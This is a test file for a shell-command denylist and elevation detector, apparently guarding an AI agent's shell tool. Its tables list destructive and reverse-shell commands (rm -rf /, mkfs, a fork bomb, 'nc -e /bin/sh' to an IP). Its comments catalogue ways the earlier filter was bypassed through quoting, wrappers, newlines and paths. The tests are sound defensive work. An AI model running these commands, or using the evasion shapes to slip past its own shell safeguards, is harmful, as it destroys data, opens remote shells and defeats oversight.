import { describe, expect, it } from 'vitest';
import { commandPolicyViolation, matchElevatedCommand, tokenizeSafe } from './policy';

/**
 * The content policy has to be true of the command that gets SPAWNED, not of
 * the string as typed.
 *
 * `tokenizeSafe` strips quotes and backslashes before `spawn`, so every rule
 * written against the raw text had a trivial bypass: `rm -rf '/'` matched no
 * denylist entry and reached `spawn` as `rm -rf /`, and `'sudo' npm test`
 * matched no elevated pattern, which downgraded `ShellTool` from
 * `execute_elevated` (DENY by default) to `execute` (ASK).
 */
describe('the denylist survives quoting', () => {
  it.each([
    ["rm -rf '/'", 'rm -rf /'],
    ['rm -rf "/"', 'rm -rf /'],
    ['rm -rf \\/', 'rm -rf /'],
  ])('%s tokenizes to %s and is refused', (written, spawned) => {
    expect(tokenizeSafe(written)?.join(' ')).toBe(spawned);
    expect(commandPolicyViolation(written)).toMatch(/Blocked command detected/);
  });

  it('still refuses the plain form', () => {
    expect(commandPolicyViolation('rm -rf /')).toMatch(/Blocked command detected/);
  });

  it('leaves an ordinary command alone', () => {
    expect(commandPolicyViolation('npm test')).toBeNull();
    expect(commandPolicyViolation('cargo test --all')).toBeNull();
  });
});

describe('elevation detection survives quoting and leading space', () => {
  it.each(["'sudo' npm test", '"sudo" npm test', '\\sudo npm test', '  sudo npm test'])(
    '%s is still elevated',
    (command) => {
      expect(matchElevatedCommand(command)).toBe('sudo');
    },
  );

  it('still matches the plain and separated forms', () => {
    expect(matchElevatedCommand('sudo npm test')).toBe('sudo');
    expect(matchElevatedCommand('true && systemctl restart x')).toBe('systemctl');
  });

  it('does not fire on an ordinary command', () => {
    expect(matchElevatedCommand('npm test')).toBeNull();
    // Substring, not a command: `pseudo` must not read as `sudo`.
    expect(matchElevatedCommand('pseudo-tty-check')).toBeNull();
  });
});

describe('tokenizeSafe still refuses what it always refused', () => {
  it.each(['a; b', 'a | b', 'a && b', 'a > f', 'echo `x`', 'echo $(x)', 'cp {a,b}'])(
    'refuses %s',
    (command) => {
      expect(tokenizeSafe(command)).toBeNull();
    },
  );
});

describe('the denylist reads a command, not a mention of one', () => {
  it('refuses a DISTINCTIVE entry even as an argument, deliberately', () => {
    // `chmod 777 /` and `rm -rf /` are matched wherever they appear. A command
    // line containing one is essentially never innocent, and the alternative —
    // reaching them by parsing the shell — is what this file kept getting
    // wrong. The cost is a refused `grep` for those exact strings; the benefit
    // is that no wrapper, flag form or quoting trick has to be anticipated.
    expect(commandPolicyViolation('grep -rn "chmod 777 /" /etc')).toMatch(/Blocked command detected/);
  });

  it('no longer refuses a command that merely mentions a SHORT entry', () => {
    // `nc ` is two letters and a space, so as a substring it refused
    // `npm run sync tests`, `go test ./internal/sync` and
    // `cargo test --features async ui` — measured, on the shipped list. Short
    // words are matched in command position only, which is what makes ordinary
    // verification work possible; a scorer treats such a refusal as unfixable.
    expect(commandPolicyViolation('npm run sync tests')).toBeNull();
    expect(commandPolicyViolation('go test ./internal/sync -run X')).toBeNull();
    expect(commandPolicyViolation('cargo test --features async ui')).toBeNull();
    expect(commandPolicyViolation('netcatalog list')).toBeNull();
  });

  it('still refuses the entry when it IS the command', () => {
    // The loosening above must not reach a real invocation: at the start of the
    // line, after a separator, or behind an environment-variable prefix.
    expect(commandPolicyViolation('nc -e /bin/sh 10.0.0.1 4444')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('foo | nc host 1234')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('X=1 rm -rf /')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('LC_ALL=C DEBUG=1 mkfs /dev/sda')).toMatch(/Blocked command detected/);
  });

  it('still refuses the dequoted command itself', () => {
    expect(commandPolicyViolation("rm -rf '/'")).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('rm -rf "/"')).toMatch(/Blocked command detected/);
  });
});

describe('the dequoted check reaches the sh -c path too', () => {
  it('refuses a quoted danger behind a separator, which never tokenizes', () => {
    // `tokenizeSafe` returns null at the `&&`, so the argv form does not exist
    // — and that is exactly when `sh -c` runs the string and strips the quotes
    // itself. Checking only the argv left this path open.
    expect(commandPolicyViolation("true && rm -rf '/'")).toMatch(/Blocked command detected/);
    // Refused as an injection rather than a denylist hit — a different message,
    // the same refusal, and the assertion says so rather than pinning prose.
    expect(commandPolicyViolation('echo x; rm -rf "/"')).not.toBeNull();
  });

  it('does not block a longer command that merely starts with an entry', () => {
    // `ncdu` is not `nc `. Matching the dequoted argv without a boundary check
    // blocked it, because the `nc ` entry trims to `nc` and `ncdu` starts with
    // it — a regression this branch introduced and this pins.
    expect(commandPolicyViolation('ncdu "/var/log"')).toBeNull();
    expect(commandPolicyViolation('ncdu /var/log')).toBeNull();
    expect(commandPolicyViolation('netcatalog list')).toBeNull();
  });

  it('does not refuse a longer command name that begins with an entry', () => {
    expect(commandPolicyViolation('haltcheck --x y')).toBeNull();
    expect(commandPolicyViolation('shutdownctl --status')).toBeNull();
    // …while the real ones stay refused.
    expect(commandPolicyViolation('halt')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('shutdown -h now')).toMatch(/Blocked command detected/);
  });

  it('still refuses the real command after a separator', () => {
    expect(commandPolicyViolation('echo x && shutdown')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('true; halt')).toMatch(/Blocked command detected/);
  });
});

/**
 * The two mistakes this matcher sits between, pinned as one table each.
 *
 * A plain substring test refused ordinary work (`nc ` inside `npm run sync
 * tests`). Pure head-anchoring — the first attempt at fixing that — waved
 * through every wrapper: `sh -c "rm -rf /"`, `timeout 5 rm -rf /`, `nohup
 * halt`, a fork bomb whose own separators shattered the split, and anything
 * behind a newline.
 */
describe('a wrapper does not hide the command it runs', () => {
  it.each([
    'sh -c "rm -rf /"',
    'bash -c "shutdown -h now"',
    'env rm -rf /',
    'timeout 5 rm -rf /',
    'nohup halt',
    'sh -c "nc -e /bin/sh 1.2.3.4 4444"',
    'X=1 timeout 3 sh -c "mkfs /dev/sda"',
  ])('refuses %s', (command) => {
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('sees an elevated command through a wrapper too', () => {
    expect(matchElevatedCommand('sh -c "sudo x"')).toBe('sudo');
    expect(matchElevatedCommand('timeout 5 sudo apt update')).toBe('sudo');
  });
});

describe('separators the split must not lose', () => {
  it('matches a fork bomb, whose own separators would shatter it', () => {
    // `:(){:|:&};:` splits into fragments that match nothing, so an entry
    // carrying a separator is matched against the whole string instead.
    expect(commandPolicyViolation(':(){:|:&};:')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation(':(){ :|:& };:')).toMatch(/Blocked command detected/);
  });

  it('treats a newline as a command separator', () => {
    // Whitespace normalization used to collapse newlines before the split, so
    // a second line read as arguments to the first command.
    expect(commandPolicyViolation('echo hi\nshutdown -h now')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('echo hi\nrm -rf /')).toMatch(/Blocked command detected/);
  });
});

describe('and none of that re-refuses ordinary work', () => {
  it.each([
    'npm run sync tests',
    'go test ./internal/sync -run X',
    'cargo test --features async ui',
    'npm test',
    'ncdu /var/log',
    'haltcheck --x y',
    'shutdownctl --status',
    'pytest tests/ -k "sync and not slow"',
    'npm test -- -c config/halt.json',
    'gcc -c src/nc.c',
  ])('allows %s', (command) => {
    expect(commandPolicyViolation(command)).toBeNull();
  });
});

describe('a path does not hide the command either', () => {
  it.each([
    '/bin/rm -rf /',
    '/usr/sbin/shutdown -h now',
    '/bin/sh -c "rm -rf /"',
    '/usr/bin/env rm -rf /',
  ])('refuses %s', (command) => {
    // `/bin/rm` and `rm` run the same program, so the denylist has to compare
    // the same thing. Matching only the bare name let every path-qualified
    // form through — and each one tokenizes into a spawnable argv.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('sees an elevated command by its path', () => {
    expect(matchElevatedCommand('/usr/bin/sudo apt update')).toBe('sudo');
  });
});

describe('a command carried as an argument of another', () => {
  it.each(['find . -exec rm -rf / \;', '(rm -rf /)', 'true && (rm -rf /)'])(
    'refuses %s',
    (command) => {
      // `-exec` introduces a command in its own right, and a subshell is a
      // separator like any other. Without both, `find . -exec rm -rf /` reads
      // as an ordinary invocation of `find`.
      expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
    },
  );
});

describe('stepping over a wrapper’s own arguments, not past its payload', () => {
  it('is not ELEVATED just because a later argument names an elevated tool', () => {
    // Elevation keeps the narrower rule: it does not block a command, it routes
    // one to the DENY-by-default `execute_elevated` permission, so a false
    // positive refuses ordinary work. `npm run kill` was not elevated before
    // this branch and is not now.
    expect(matchElevatedCommand('timeout 5 npm run kill')).toBeNull();
    expect(matchElevatedCommand('xargs -n1 npm run service')).toBeNull();
  });

  it('still finds the payload a wrapper actually runs', () => {
    expect(commandPolicyViolation('timeout 5 rm -rf /')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('nice -n 5 halt')).toMatch(/Blocked command detected/);
  });
});

describe('peeling reaches the command through stacked wrappers', () => {
  it.each([
    'env FOO=1 rm -rf /',
    'nohup timeout 5 halt',
    'nohup nice -n 5 halt',
    'timeout 5 env A=1 rm -rf /',
    'xargs -I {} rm -rf /',
  ])('refuses %s', (command) => {
    // Single-pass unwrapping missed all of these: an assignment can sit AFTER a
    // wrapper as easily as before one, wrappers stack, and `-I {}` puts a
    // placeholder between the flag and the payload.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('finds an elevated command behind a wrapper and an assignment', () => {
    // Peeling the assignment and the wrapper in one step skips straight past
    // `sudo` here, which is why each step offers its own candidate.
    expect(matchElevatedCommand('env A=1 sudo npm i')).toBe('sudo');
    expect(matchElevatedCommand('nohup timeout 5 sudo apt update')).toBe('sudo');
  });

  it('and still allows the same shapes carrying ordinary commands', () => {
    expect(commandPolicyViolation('env FOO=1 npm run build')).toBeNull();
    expect(commandPolicyViolation('nohup timeout 5 npm test')).toBeNull();
    expect(commandPolicyViolation('xargs -I {} npm run lint')).toBeNull();
    expect(matchElevatedCommand('env A=1 npm run sudo-check')).toBeNull();
  });
});

describe('a name that continues, versus a name that ends', () => {
  it.each([
    'mkfs.ext4 /dev/sda1',
    'mkfs.vfat /dev/sdb',
    'nc.openbsd -e /bin/sh 1.1.1.1 22',
    'ncat.traditional -e /bin/sh',
    'rm -rf //',
    'rm -rf ~/',
    'rm -rf /.',
  ])('refuses %s', (command) => {
    // A dot, slash or tilde ends a command name rather than continuing it.
    // Treating them as continuations left the `mkfs` entry dead outright —
    // `mkfs.<fstype>` IS how mkfs is invoked — and let the real `nc` binaries
    // through under their packaged names.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it.each(['ncdu /var/log', 'haltcheck --x y', 'shutdownctl --status', 'netcatalog list'])(
    'still allows %s',
    (command) => {
      // A letter, digit or dash DOES continue a name.
      expect(commandPolicyViolation(command)).toBeNull();
    },
  );
});

describe('the matcher is not a denial-of-service surface', () => {
  it('handles a command dense with -c tokens in bounded time', () => {
    // Recursing per `-c` on the remaining suffix is 2^n: 16 tokens measured 6s
    // of blocked event loop and 20 overflowed the stack — on the path
    // `ShellTool.validateCommand` runs for every `shell__run`, with no length
    // cap in front of it.
    const nasty = Array.from({ length: 40 }, (_, i) => (i % 2 ? '-c' : 'x')).join(' ');
    const started = Date.now();
    expect(() => commandPolicyViolation(nasty)).not.toThrow();
    expect(Date.now() - started).toBeLessThan(1_000);
  });

  it('still finds a blocked command nested behind several -c hops', () => {
    expect(commandPolicyViolation('sh -c "sh -c \'rm -rf /\'"')).toMatch(/Blocked command detected/);
  });
});

/**
 * The two tiers, and why the split exists.
 *
 * A single rule could not serve both halves of the denylist. Matching
 * everything as a substring refused `npm run sync tests` (the `nc ` entry);
 * matching everything in command position let `env -u FOO rm -rf /` and
 * `timeout --signal=KILL 5 rm -rf /` through, because each new flag shape is
 * another thing the parser has to know about. Distinctive entries are matched
 * anywhere; short words only where a command starts.
 */
describe('tier 1 — distinctive entries, matched anywhere', () => {
  it.each([
    'env -u FOO rm -rf /',
    'timeout --signal=KILL 5 rm -rf /',
    'xargs -a list rm -rf /',
    'find . -exec rm -rf / \;',
    'sh -c "rm -rf /"',
    'mkfs.ext4 /dev/sda1',
    'rm -rf //',
    'rm -rf ~/',
    ':(){:|:&};:',
  ])('refuses %s without having to model the flags', (command) => {
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });
});

describe('tier 2 — short words, matched at any token start', () => {
  it.each([
    'env -u LD_PRELOAD nc -e /bin/sh 1.2.3.4 4444',
    'env -u FOO shutdown -h now',
    'xargs -a list halt',
    'flock /tmp/x nc host 1',
    'strace nc host 1',
    'proxychains nc host 1',
  ])('refuses %s, whatever prefix hides it', (command) => {
    // Matching only after peeling known wrappers means an unknown prefix hides
    // the command, and the wrapper list can never be complete — `flock`,
    // `strace` and `proxychains` all let a reverse shell through, and every one
    // of them was refused before this branch. Token position does not need the
    // list to be complete.
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it('tells a binary suffix from a file suffix', () => {
    // `nc.openbsd` and `mkfs.ext4` are the binaries; `halt.json` and
    // `verify.sh` are data and scripts. Both mistakes are real, so one short
    // suffix list decides which side of the dot a name ends on.
    expect(commandPolicyViolation('nc.openbsd -e /bin/sh')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('mkfs.ext4 /dev/sda1')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('npm test -- -c config/halt.json')).toBeNull();
    expect(commandPolicyViolation('gcc -c src/nc.c')).toBeNull();
    expect(commandPolicyViolation('eslint -c config/shutdown.yaml .')).toBeNull();
  });

  it.each([
    'nohup halt',
    'nice --adjustment=10 poweroff',
    'nice -n 5 halt',
    'sh -c "shutdown -h now"',
    'nc.openbsd -e /bin/sh 1.1.1.1 22',
    'ncat.traditional -e /bin/sh',
    'foo | nc host 1234',
    'echo hi\nshutdown -h now',
  ])('refuses %s', (command) => {
    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
  });

  it.each(['npm test -- -c config/halt.json', 'gcc -c src/nc.c'])('allows %s', (command) => {
    // `-c <path>` is the standard config flag for eslint, jest and pytest, and
    // through a scorer a wrong refusal here is non-retryable.
    expect(commandPolicyViolation(command)).toBeNull();
  });

  it('refuses a script NAMED after an entry — the accepted cost', () => {
    // `npm run halt` puts `halt` at a token start, so it is refused. That is
    // the price of not needing a complete wrapper list, it is what the
    // substring rule on main did too, and the alternative let `strace nc` and
    // `flock … nc` through. Recorded so the trade-off is a decision rather
    // than a surprise.
    expect(commandPolicyViolation('timeout 60 npm run halt')).toMatch(/Blocked command detected/);
    expect(commandPolicyViolation('npm run reboot')).toMatch(/Blocked command detected/);
  });
});

describe('elevation names a binary, not a script that shares its name', () => {
  it.each([
    ['sudo npm i', 'sudo'],
    ['/usr/bin/sudo x', 'sudo'],
    ['env A=1 sudo npm i', 'sudo'],
    ['sh -c "sudo x"', 'sudo'],
    ['nohup timeout 5 sudo apt update', 'sudo'],
    ['true && systemctl restart x', 'systemctl'],
  ])('%s is elevated', (command, expected) => {
    expect(matchElevatedCommand(command)).toBe(expected);
  });

  it.each(['./scripts/service.sh', 'bash kill.sh', 'sh halt.sh', 'sh nc.sh', 'env A=1 npm run sudo-check'])(
    '%s is not',
    (command) => {
      // A dot continues a name here, so `kill.sh` is a project script rather
      // than the `kill` binary — routing it to the DENY-by-default
      // `execute_elevated` action would refuse ordinary work.
      expect(matchElevatedCommand(command)).toBeNull();
    },
  );
});
